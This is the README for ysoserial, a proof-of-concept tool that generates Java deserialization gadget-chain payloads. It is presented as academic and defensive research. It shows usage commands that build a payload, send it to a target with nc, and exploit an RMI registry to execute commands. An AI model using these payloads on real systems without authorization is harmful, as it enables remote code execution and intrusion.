
# ysoserial 

A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.

![](https://github.com/frohoff/ysoserial/blob/master/ysoserial.png)

## Description

Released as part of AppSecCali 2015 Talk ["Marshalling Pickles: how deserializing objects will ruin your day"](http://frohoff.github.io/appseccali-marshalling-pickles/) 

__ysoserial__ is a collection of utilities and property-oriented programming "gadget chains" discovered in common java 
libraries that can, under the right conditions, exploit Java applications performing __unsafe deserialization__ of objects. 
The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then
serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes
this data, the chain will automatically be invoked and cause the command to be executed on the application host.

It should be noted that the vulnerability lies in the application performing unsafe deserialization and NOT in having
gadgets on the classpath.

## Disclaimer

This software has been created purely for the purposes of academic research and
for the development of effective defensive techniques, and is not intended to be
used to attack systems except where explicitly authorized. Project maintainers 
are not responsible or liable for misuse of the software. Use responsibly.

## Usage

```shell
$ java -jar ysoserial-0.0.1-all.jar
Y SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'
        Available payload types:
                CommonsCollections1
                CommonsCollections2
                Groovy1
                Spring1           
```

## Examples

```shell
$ java -jar ysoserial-0.0.1-all.jar CommonsCollections1 calc.exe | xxd
0000000: aced 0005 7372 0032 7375 6e2e 7265 666c  ....sr.2sun.refl
0000010: 6563 742e 616e 6e6f 7461 7469 6f6e 2e41  ect.annotation.A
0000020: 6e6e 6f74 6174 696f 6e49 6e76 6f63 6174  nnotationInvocat
...
0000550: 7672 0012 6a61 7661 2e6c 616e 672e 4f76  vr..java.lang.Ov
0000560: 6572 7269 6465 0000 0000 0000 0000 0000  erride..........
0000570: 0078 7071 007e 003a                      .xpq.~.:
       
$ java -jar ysoserial-0.0.1-all.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 < groovypayload.bin

$ java -cp ysoserial-0.0.1-all.jar ysoserial.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe
```

## Installation

1. Download the latest jar from the "releases" section.

## Code Status

[![Build Status](https://travis-ci.org/frohoff/ysoserial.svg?branch=master)](https://travis-ci.org/frohoff/ysoserial)

## Contributing

1. Fork it
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create new Pull Request
